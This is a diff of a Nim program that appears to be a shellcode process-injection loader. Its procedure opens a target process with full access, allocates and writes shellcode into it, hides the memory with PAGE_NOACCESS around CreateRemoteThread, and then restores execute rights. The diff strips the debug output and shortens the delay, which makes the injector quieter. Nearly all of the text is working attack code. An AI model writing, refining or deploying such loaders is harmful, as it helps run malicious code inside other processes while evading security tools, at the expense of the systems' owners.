@@ -11,16 +11,12 @@ proc suspendedThread[byte](shellcode: openArray[byte]): void =
   tProcess.suspend() # That's handy!
   defer: tProcess.close()
 
-  echo "[*] Target Process: ", tProcess.processID
-
   let pHandle = OpenProcess(
     PROCESS_ALL_ACCESS, 
     false, 
     cast[DWORD](tProcess.processID)
   )
   defer: CloseHandle(pHandle)
-
-  echo "[*] pHandle: ", pHandle
 
   let rPtr = VirtualAllocEx(
     pHandle,
@@ -39,9 +35,6 @@ proc suspendedThread[byte](shellcode: openArray[byte]): void =
     addr bytesWritten
   )
 
-  echo "[*] WriteProcessMemory: ", bool(wSuccess)
-  echo "    \\-- bytes written: ", bytesWritten
-  echo ""
   VirtualProtect(cast[LPVOID](rPtr), shellcode.len, PAGE_NOACCESS,addr op)
   let tHandle = CreateRemoteThread(
     pHandle, 
@@ -53,11 +46,9 @@ proc suspendedThread[byte](shellcode: openArray[byte]): void =
     NULL
   )
 
-  sleep(10000)
+  sleep(1000)
   VirtualProtect(cast[LPVOID](rPtr), shellcode.len, PAGE_EXECUTE_READ_WRITE,addr op)
   ResumeThread(tHandle)
-  echo "[*] tHandle: ", tHandle
-  echo "[+] Injected" 
   
 when isMainModule:
   func toByteSeq*(str: string): seq[byte] {.inline.} =
